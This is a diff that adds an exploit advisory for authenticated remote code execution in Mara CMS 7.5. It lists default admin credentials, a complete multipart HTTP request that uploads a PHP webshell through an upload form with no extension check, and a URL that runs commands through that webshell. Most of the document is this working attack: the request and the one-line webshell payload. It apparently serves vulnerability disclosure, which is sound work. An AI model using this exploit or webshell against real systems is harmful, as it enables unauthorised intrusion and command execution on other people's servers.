@@ -1,0 +1,101 @@
+# Exploit Title: Mara CMS 7.5 - Remote Code Execution (Authenticated)
+# Google Dork: N/A
+# Date: 2020-08-31
+# Exploit Author: Michele Cisternino (0blio_)
+# Vendor Homepage: https://sourceforge.net/projects/maracms/
+# Software Link: https://sourceforge.net/projects/maracms/files/MaraCMS75.zip/download
+# Version: 7.5
+# Tested on: Kali Linux(x64)
+# CVE: N/A
+
+
+# Description
+
+
+MaraCMS 7.5 is vulnerable to Authenticated Remote Code Execution.
+In order to exploit the vulnerability, an attacker must have a valid authenticated session on the CMS as 'admin' or 'manager'.
+The file uploader fails to check extensions of files uploaded by the user, so it is possible to upload a webshell and get RCE.
+
+
+# PoC
+
+
+1. Login on MaraCMS. Default credentials are:
+      Username: admin
+      Password: changeme
+
+
+2. Navigate the file upload functionality (http://target/codebase/dir.php?type=filenew) and upload a file called 'webshell.php' with content '<?php system($_GET["cmd"]); ?>'.
+    A request similar to the following will be made:
+
+
+        POST /codebase/handler.php HTTP/1.1
+        Host: localhost
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------1202504167994776142974823268
+        Content-Length: 1282
+        Origin: http://localhost
+        Connection: close
+        Referer: http://localhost/codebase/dir.php?type=filenew
+        Cookie: your_sitename_session_session=krevi5f3gr416p3o7cqdk4j1vv
+        Upgrade-Insecure-Requests: 1
+
+
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="authenticated"
+
+
+        MQ==
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="action"
+
+
+        dXBsb2Fk
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+
+        10485760
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="type"
+
+
+        filenew
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="files[]"; filename="webshell.php"
+        Content-Type: application/x-php
+
+
+        <?php system($_GET["cmd"]); ?>
+
+
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="usr"
+
+
+        YWRtaW4=
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="pwd"
+
+
+        MWUyNzUwMTA3OTgyNzQ2NTQ5ZDZlYWY0MWNmMzcwZTBlZTc3NWNiNWZiNTExMWNhOGI5ZWNjNWI0M2JkOGE2NA==
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="authenticated"
+
+
+        MQ==
+        -----------------------------1202504167994776142974823268
+        Content-Disposition: form-data; name="destdir"
+
+
+
+
+        -----------------------------1202504167994776142974823268--
+
+
+3. Execute remote commands by navigating:
+
+     http://target/webshell.php?cmd=whoami
